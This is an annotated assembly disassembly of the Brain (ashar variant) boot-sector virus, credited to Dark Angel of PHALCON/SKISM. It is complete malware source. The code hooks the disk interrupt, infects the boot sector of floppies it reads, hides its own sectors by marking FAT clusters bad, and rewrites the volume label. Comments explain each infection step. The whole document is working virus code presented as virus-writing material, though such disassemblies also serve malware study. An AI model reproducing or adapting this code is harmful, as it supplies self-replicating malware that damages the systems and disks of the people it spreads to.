
; This is the ashar variant of the classic Pakistani Brain virus. It is large
; by today's standards, although it was one of the first.  It is a floppy only
; boot sector infector.

brain           segment byte public
		assume  cs:brain, ds:brain
; Disassembly done by Dark Angel of PHALCON/SKISM
		org     0

		cli
		jmp     entervirus
idbytes         db       34h, 12h
firsthead       db      0
firstsector     dw      2707h
curhead         db      0
cursector       dw      1
		db      0, 0, 0, 0
		db      'Welcome to the  Dungeon         '
copyright       db      '(c) 1986 Brain'
		db      17h
		db      '& Amjads (pvt) Ltd   VIRUS_SHOE '
		db      ' RECORD   v9.0   Dedicated to th'
		db      'e dynamic memories of millions o'
		db      'f virus who are no longer with u'
		db      's today - Thanks GOODNESS!!     '
		db      '  BEWARE OF THE er..VIRUS  : \th'
		db      'is program is catching      prog'
		db      'ram follows after these messeges'
		db      '..... $'
		db      '#@%$'
		db      '@!! '
entervirus:
		mov     ax,cs
		mov     ds,ax                   ; ds = 0
		mov     ss,ax                   ; set stack to after
		mov     sp,0F000h               ; virus
		sti
		mov     al,ds:[7C00h+offset firsthead]
		mov     ds:[7C00h+offset curhead],al
		mov     cx,ds:[7C00h+offset firstsector]
		mov     ds:[7C00h+offset cursector],cx
		call    calcnext
		mov     cx,5                    ; read five sectors
		mov     bx,7C00h+200h           ; after end of virus

loadnext:
		call    readdisk
		call    calcnext
		add     bx,200h
		loop    loadnext

		mov     ax,word ptr ds:[413h]   ; Base memory size in Kb
		sub     ax,7                    ; - 7 Kb
		mov     word ptr ds:[413h],ax   ; Insert as new value
		mov     cl,6
		shl     ax,cl                   ; Convert to paragraphs
		mov     es,ax
		mov     si,7C00h                ; Copy from virus start
		mov     di,0                    ; to start of memory
		mov     cx,1004h                ; Copy 1004h bytes
		cld
		rep     movsb
		push    es
		mov     ax,200h
		push    ax
		retf                            ; return to old boot sector

readdisk:
		push    cx
		push    bx
		mov     cx,4                    ; Try 4 times

tryread:
		push    cx
		mov     dh,ds:[7C00h+offset curhead]
		mov     dl,0                    ; Read sector from default
		mov     cx,ds:[7C00h+offset cursector]
		mov     ax,201h                 ; Disk to memory at es:bx
		int     13h
		jnc     readOK
		mov     ah,0                    ; Reset disk
		int     13h                     ; (force read track 0)
		pop     cx
		loop    tryread

		int     18h                     ; ROM basic on failure
readOK:
		pop     cx
		pop     bx
		pop     cx
		retn

calcnext:
		mov     al,byte ptr ds:[7C00h+offset cursector]
		inc     al
		mov     byte ptr ds:[7C00h+offset cursector],al
		cmp     al,0Ah
		jne     donecalc
		mov     byte ptr ds:[7C00h+offset cursector],1
		mov     al,ds:[7C00h+offset curhead]
		inc     al
		mov     ds:[7C00h+offset curhead],al
		cmp     al,2
		jne     donecalc
		mov     byte ptr ds:[7C00h+offset curhead],0
		inc     byte ptr ds:[7C00h+offset cursector+1]
donecalc:
		retn

; the following is a collection of garbage bytes
		db       00h, 00h, 00h, 00h, 32h,0E3h
		db       23h, 4Dh, 59h,0F4h,0A1h, 82h
		db      0BCh,0C3h, 12h, 00h, 7Eh, 12h
		db      0CDh, 21h,0A2h, 3Ch, 5Fh
a_data          dw      050Ch
; Second part of the virus begins here
		jmp     short entersecondpart
		db      '(c) 1986 Brain & Amjads (pvt) Ltd ',0
readcounter     db      4                       ; keep track of # reads
curdrive        db      0
int13flag       db      0

entersecondpart:
		mov     cs:readcounter,1Fh
		xor     ax,ax
		mov     ds,ax                   ; ds -> interrupt table
		mov     ax,ds:[13h*4]
		mov     ds:[6Dh*4],ax
		mov     ax,ds:[13h*4+2]
		mov     ds:[6Dh*4+2],ax
		mov     ax,offset int13         ; 276h
		mov     ds:[13h*4],ax
		mov     ax,cs
		mov     ds:[13h*4+2],ax
		mov     cx,4                    ; 4 tries
		xor     ax,ax
		mov     es,ax                   ; es -> interrupt table

tryreadbootsector:
		push    cx
		mov     dh,cs:firsthead
		mov     dl,0
		mov     cx,cs:firstsector
		mov     ax,201h                 ; read from default disk
		mov     bx,7C00h
		int     6Dh                     ; int 13h
		jnc     readbootOK
		mov     ah,0
		int     6Dh                     ; int 13h
		pop     cx
		loop    tryreadbootsector

		int     18h                     ; ROM basic on failure
readbootOK:                                     ; return control to
						; original boot sector
;*              jmp     far ptr 0000:7C00h
		db      0EAh, 00h, 7Ch, 00h, 00h
		nop                             ; MASM NOP!!!
int13:
		sti
		cmp     ah,2                    ; if not read request,
		jne     doint13                 ; do not go further
		cmp     dl,2                    ; if after second floppy,
		ja      doint13                 ; do not go further
		cmp     ch,0                    ; if not reading boot sector,
		jne     regularread             ; go handle as usual
		cmp     dh,0                    ; if boot sector,
		je      readboot                ; do I<-/>/\|> stuff
regularread:
		dec     cs:readcounter          ; Infect after 4 reads
		jnz     doint13                 ; If counter still OK, don't
						; do anything else
		jmp     short readboot          ; Otherwise, try to infect
doint13:
		jmp     exitint13h
readboot:
; FINISH THIS!
		mov     cs:int13flag,0          ; clear flag
		mov     cs:readcounter,4        ; reset counter
		push    ax
		push    bx
		push    cx
		push    dx
		mov     cs:curdrive,dl
		mov     cx,4

tryreadbootblock:
		push    cx
		mov     ah,0                    ; Reset disk
		int     6Dh
		jc      errorreadingbootblock   ; Try again
		mov     dh,0
		mov     cx,1
		mov     bx,offset readbuffer    ; buffer @ 6BEh
		push    es
		mov     ax,cs
		mov     es,ax
		mov     ax,201h
		int     6Dh                     ; Read boot sector
		pop     es
		jnc     continuestuff           ; continue if no error
errorreadingbootblock:
		pop     cx
		loop    tryreadbootblock

		jmp     short resetdisk         ; too many failures
		nop
continuestuff:
		pop     cx                      ; get system id in boot block
		mov     ax,word ptr cs:[offset readbuffer+4]
		cmp     ax,1234h                ; already infected?
		jne     dodisk                  ; if not, infect it
		mov     cs:int13flag,1          ; flag prev. infection
		jmp     short noreset
dodisk:
		push    ds
		push    es
		mov     ax,cs
		mov     ds,ax
		mov     es,ax
		push    si
		call    writevirus              ; infect the disk
		jc      failme                  ; exit on failure
		mov     cs:int13flag,2          ; flag success
		call    changeroot              ; manipulate volume label
failme:
		pop     si
		pop     es
		pop     ds
		jnc     noreset                 ; don't reset on success
resetdisk:
		mov     ah,0                    ; reset disk
		int     6Dh                     ; int 13h
noreset:
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		cmp     cx,1
		jne     exitint13h
		cmp     dh,0
		jne     exitint13h
		cmp     cs:int13flag,1          ; already infected?
		jne     wasntinfected           ; if wasn't, go elsewhere
		mov     cx,word ptr cs:[offset readbuffer+7]
		mov     dx,word ptr cs:[offset readbuffer+5]
		mov     dl,cs:curdrive          ; otherwise, read real
		jmp     short exitint13h        ; boot sector
wasntinfected:
		cmp     cs:int13flag,2          ; successful infection?
		jne     exitint13h              ; if not, just do call
		mov     cx,cs:firstsector
		mov     dh,cs:firsthead
exitint13h:
		int     6Dh                     ; int 13h
		retf    2
		db      15 dup (0)

FATManip:                                       ; returns al as error code
		jmp     short delvedeeper
		nop
FATManipreadcounter dw      3
		db      ' (c) 1986 Brain & Amjads (pvt) Ltd'
delvedeeper:
		call    readFAT                 ; Get FAT ID byte
		mov     ax,word ptr ds:[offset readbuffer]
		cmp     ax,0FFFDh               ; is it 360K disk?
		je      is360Kdisk              ; continue if so
		mov     al,3                    ; al=3 == not good disk
		stc                             ; flag error
		retn                            ; and exit
is360Kdisk:
		mov     cx,37h
		mov     FATManipreadcounter,0   ; none found yet
checknextsector:
		call    FATentry12bit           ; get entry in FAT
		cmp     ax,0                    ; unused?
		jne     notunused
		inc     FATManipreadcounter     ; one more found unused
		cmp     FATManipreadcounter,3   ; If need more,
		jne     tryanother              ;  go there
		jmp     short markembad         ; found 3 consecutive
		nop                             ; empty sectors
notunused:
		mov     FATManipreadcounter,0   ; must start over
tryanother:
		inc     cx                      ; try next sector
		cmp     cx,163h                 ; end of disk?
		jne     checknextsector         ; if not, continue
		mov     al,1                    ; al=1 == none empty
		stc                             ; Indicate error
		retn
markembad:
		mov     dl,3                    ; 3 times
markanotherbad:
		call    markbad12bit
		dec     cx
		dec     dl
		jnz     markanotherbad
		inc     cx
		call    calc1sttrack
		call    writeFAT                ; update FAT
		mov     al,0                    ; al=0 == ok
		clc                             ; indicate success
		retn

markbad12bit:
		push    cx
		push    dx
		mov     si,offset readbuffer    ; si -> buffer
		mov     al,cl
		shr     al,1
		jc      low_12                  ; low bits
		call    clus2offset12bit
		mov     ax,[bx+si]              ; get FAT entry
		and     ax,0F000h               ; mark it bad
		or      ax,0FF7h
		jmp     short putitback         ; and put it back
		nop
low_12:
		call    clus2offset12bit
		mov     ax,[bx+si]              ; get FAT entry
		and     ax,0Fh                  ; mark it bad
		or      ax,0FF70h
putitback:
		mov     [bx+si],ax              ; replace FAT entry
		mov     word ptr ds:[400h][bx+si],ax ; in two places
		pop     dx
		pop     cx
		retn

FATentry12bit:
		push    cx
		mov     si,offset readbuffer    ; si->buffer
		mov     al,cl
		shr     al,1
; Part 3 of the virus starts here
		jc      want_high_12
		call    clus2offset12bit
		mov     ax,[bx+si]
		and     ax,0FFFh
		jmp     short exitFATentry12bit
		nop
want_high_12:
		call    clus2offset12bit        ; xxxxxxxxxxxx0000
		mov     ax,[bx+si]              ; ^^^^^^^^^^^^wanted
		and     ax,0FFF0h               ; mask wanted bits
		mov     cl,4                    ; and move to correct
		shr     ax,cl                   ; position
exitFATentry12bit:
		pop     cx
		retn

clus2offset12bit:
		push    dx
		mov     ax,3
		mul     cx
		shr     ax,1                    ; ax = cx*1.5
		mov     bx,ax
		pop     dx
		retn

readFAT:
		mov     ah,2                    ; read
		call    FAT_IO
		retn

writeFAT:
		mov     ah,3                    ; write
		call    FAT_IO
		retn

FAT_IO:
		mov     cx,4                    ; try four times
FAT_IOLoop:
		push    cx
		push    ax
		mov     ah,0                    ; reset disk
		int     6Dh                     ; int 13h
		pop     ax
		jc      tryFAT_IOagain
		mov     bx,offset readbuffer
		mov     al,4                    ; 4 sectors
		mov     dh,0                    ; head 0
		mov     dl,curdrive
		mov     cx,2                    ; sector 2
		push    ax                      ; (FAT)
		int     6Dh                     ; int 13h
		pop     ax
		jnc     exitFAT_IO
tryFAT_IOagain:
		pop     cx
		loop    FAT_IOLoop

		pop     ax
		pop     ax
		mov     al,2
		stc                             ; mark error
		retn
exitFAT_IO:
		pop     cx
		retn

calc1sttrack:
		push    cx
		sub     cx,2
		shl     cx,1                    ; 2 sectors/cluster
		add     cx,0Ch                  ; start of data area
		mov     ax,cx                   ; ax = sector
		mov     cl,12h                  ; 4096
		div     cl                      ; ax/4096 = al rem ah
		mov     byte ptr firstsector+1,al
		mov     firsthead,0
		inc     ah
		cmp     ah,9                    ; past track 9?
		jbe     notpasttrack9           ; nope, we are ok
		sub     ah,9                    ; otherwise, adjust
		mov     firsthead,1
notpasttrack9:
		mov     byte ptr firstsector,ah
		pop     cx
		retn

		db      0, 0, 0, 0, 0, 0
r_or_w_root     db      3
entrycount      dw      35h

tempsave1       dw      303h
tempsave2       dw      0EBEh
tempsave3       dw      1
tempsave4       dw      100h
		db      0E0h,0D8h, 9Dh,0D7h,0E0h, 9Fh
		db       8Dh, 98h, 9Fh, 8Eh,0E0h
		db      ' (c) ashar $'
changeroot:
		call    readroot                ; read in root directory
		jc      donotchangeroot
		push    di
		call    changevolume            ; change volume label
		pop     di
		jc      donotchangeroot
		call    writeroot               ; write back new root dir
donotchangeroot:
		retn
; The following is just garbage bytes
		db      0BBh, 9Bh, 04h,0B9h, 0Bh
		db      0,8Ah,7,0F6h,0D8h,88h,4,46h,43h
		db      0E2h,0F6h,0B0h,8,88h,4,0F8h,0C3h
		db      0C6h, 06h

changevolume:
		mov     entrycount,6Ch
		mov     si,offset readbuffer+40h; 3nd dir entry
		mov     tempsave1,dx
		mov     ax,entrycount           ; 6Ch
		shr     ax,1
		mov     tempsave3,ax            ; 36h
		shr     ax,1
		mov     tempsave2,ax            ; 1Bh
		xchg    ax,cx
		and     cl,43h                  ; cx = 3
		mov     di,tempsave2
		add     di,1E3h                 ; di = 01FE
findlabel:
		mov     al,[si]
		cmp     al,0
		je      dolabel                 ; no mo entries
		mov     al,[si+0Bh]             ; attribute byte
		and     al,8                    ; volume label?
		cmp     al,8                    ; yes?
		je      dolabel                 ; then change it!
		add     si,20h                  ; go to next directory entry
		dec     entrycount
		jnz     findlabel               ; loop back
		stc                             ; Error!
		retn
		db      8Bh
dolabel:
		mov     bx,[di]                 ; offset a_data
		xor     bx,tempsave3            ; bx = 53Ah
		mov     tempsave3,si            ; si->direntry
		cli
		mov     ax,ss
		mov     tempsave1,ax
		mov     tempsave2,sp
		mov     ax,cs
		mov     ss,ax
		mov     sp,tempsave3
		add     sp,0Ch                  ;->reserved area
		mov     cl,51h
		add     dx,444Ch
		mov     di,2555h
		mov     cx,0C03h
		repe    cmpsw
		mov     ax,0B46h
		mov     cx,3
		rol     ax,cl                   ; ax = 5A30h
		mov     tempsave3,ax
		mov     cx,5
		mov     dx,8
		sub     tempsave3,5210h         ; 820h
		push    tempsave3               ; store attributes/reserved
; I haven't commented the remainder of this procedure.
; It basically changes the volume label to read "(c) Brain"

; Comment mode OFF

dowhatever:
		mov     ah,[bx]                 ; 5a3h
		inc     bx
		mov     dl,ah
		shl     dl,1
		jc      dowhatever
searchstuff:
		mov     dl,[bx]                 ; dl=C2h
		inc     bx                      ; bx=53Eh
		mov     al,dl
		shl     dl,1
		jc      searchstuff
		add     ax,1D1Dh
		push    ax
		inc     tempsave3
		db       73h, 01h               ; jnc $+3
		db      0EAh,0E2h,0E1h, 8Bh, 26h; jmp 268B:E1E2
		xchg    bp,ax
		add     al,0A1h
		xchg    bx,ax
		add     al,8Eh
		sar     bl,1
		add     dh,[bp+si]
		clc
		ret
		;db       95h, 04h,0A1h, 93h, 04h, 8Eh
		;db      0D0h,0FBh, 02h, 32h,0F8h,0C3h

; Comment mode ON

readroot:
		mov     r_or_w_root,2           ; set action code
		jmp     short do_rw_root        ; easier to do w/
		nop                             ; mov ah, 2
writeroot:
		mov     r_or_w_root,3
		jmp     short do_rw_root        ; this is somewhat useless
		nop
do_rw_root:
		mov     dh,0                    ; head 0
		mov     dl,curdrive
		mov     cx,6                    ; sector 6
		mov     ah,r_or_w_root
		mov     al,4                    ; 4 sectors
		mov     bx,offset readbuffer
		call    doint13h
		jc      exit_rw_root            ; quit on error
		mov     cx,1
		mov     dh,1                    ; head 1
		mov     ah,r_or_w_root
		mov     al,3
		add     bx,800h
		call    doint13h

exit_rw_root:
		retn

doint13h:
		mov     tempsave1,ax
		mov     tempsave2,bx
		mov     tempsave3,cx
		mov     tempsave4,dx
		mov     cx,4

doint13hloop:
		push    cx
		mov     ah,0                    ; Reset disk
		int     6Dh
		jc      errordoingint13h
		mov     ax,tempsave1
		mov     bx,tempsave2
		mov     cx,tempsave3
		mov     dx,tempsave4
		int     6Dh                     ; int 13h
		jnc     int13hsuccess
errordoingint13h:
		pop     cx
		loop    doint13hloop

		stc                             ; indicate error
		retn
int13hsuccess:
		pop     cx
		retn

		db      0, 0, 0
; Part 4 of the virus starts here
tempstorecx     dw      3
readwritecurrentdata    dw      301h

writevirus:
		call    FATManip
		jc      exitwritevirus
		mov     cursector,1
		mov     curhead,0
		mov     bx,offset readbuffer
		call    readcurrent
		mov     bx,offset readbuffer
		mov     ax,firstsector
		mov     cursector,ax
		mov     ah,firsthead
		mov     curhead,ah
		call    writecurrent
		call    calcnextsector
		mov     cx,5
		mov     bx,200h
writeanothersector:
		mov     tempstorecx,cx
		call    writecurrent
		call    calcnextsector
		add     bx,200h
		mov     cx,tempstorecx
		loop    writeanothersector

		mov     curhead,0
		mov     cursector,1
		mov     bx,0
		call    writecurrent
		clc                             ; indicate success
exitwritevirus:
		retn


readcurrent:
		mov     readwritecurrentdata,201h
		jmp     short doreadwrite
		nop
writecurrent:
		mov     readwritecurrentdata,301h
		jmp     short doreadwrite       ; This is pointless.
		nop
doreadwrite:
		push    bx
		mov     cx,4

tryreadwriteagain:
		push    cx
		mov     dh,curhead
		mov     dl,curdrive
		mov     cx,cursector
		mov     ax,readwritecurrentdata ; read or write?
		int     6Dh                     ; int 13h
		jnc     readwritesuccessful
		mov     ah,0                    ; reset disk
		int     6Dh                     ; int 13h
		pop     cx
		loop    tryreadwriteagain

		pop     bx
		pop     bx
		stc                             ; Indicate error
		retn
readwritesuccessful:
		pop     cx
		pop     bx
		retn


calcnextsector:
		inc     byte ptr cursector      ; next sector
		cmp     byte ptr cursector,0Ah
		jne     donecalculate           ; finished calculations
		mov     byte ptr cursector,1    ; clear sector #
		inc     curhead                 ; and go to next head
		cmp     curhead,2               ; if not too large,
		jne     donecalculate           ; we are done
		mov     curhead,0               ; otherwise clear head #
		inc     byte ptr cursector+1    ; and advance cylinder
donecalculate:
		retn

		db       64h, 74h, 61h

; read buffer starts here
; insert your favorite boot block below...
readbuffer:
brain           ends
		end
